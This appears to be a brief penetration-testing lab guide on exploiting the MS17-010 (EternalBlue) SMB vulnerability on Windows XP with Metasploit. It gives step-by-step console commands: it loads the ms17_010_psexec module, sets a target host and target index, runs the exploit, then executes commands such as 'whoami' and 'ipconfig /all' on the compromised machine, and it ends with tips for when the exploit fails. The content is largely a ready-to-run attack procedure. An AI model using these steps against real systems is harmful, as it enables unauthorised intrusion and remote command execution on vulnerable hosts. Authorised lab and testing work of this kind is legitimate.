## Using Metasploit: MS17-010 
- focuses on scanning, common reliability issues, and running command-execution payloads via SMB.
- Target OS: Windows XP
- Interface: Ubuntu

## Tools:
 - Metasploit Framework

## How to use
1. Launch Metasploit
```
msfconsole
```
This opens a console prompt that looks like this:
```
msf >
```

From here, you can select and configure modules for MS17-010.
Be sure to look for output indicating the host is vulnerable before attempting Metasploit modules.

2. In msf console
```
msf > use windows/smb/ms17_010_psexec
```
Set the target host:
```
msf exploit(windows/smb/ms17_010_psexec) > set RHOSTS [target_ip]
                                # example: set RHOSTS 192.168.1.120
msf exploit(windows/smb/ms17_010_psexec) > set target 3
msf exploit(windows/smb/ms17_010_psexec) > run
```
This should establish a session or execute the configured command on the remote host

3. Running commands
In the module:

```
msf > set command "<command>"
msf > run   # or: exploit
```

Examples:

```
msf > set command "whoami"
msf > run
```
or
```
msf > set command "ipconfig /all"
msf > run
```

## Notes
If EternalBlue fails repeatedly, consider:
- Validating connectivity (firewalls, etc.)
- Verifying the OS/service pack or SMB configuration
- Switching to other modules that use MS17-010
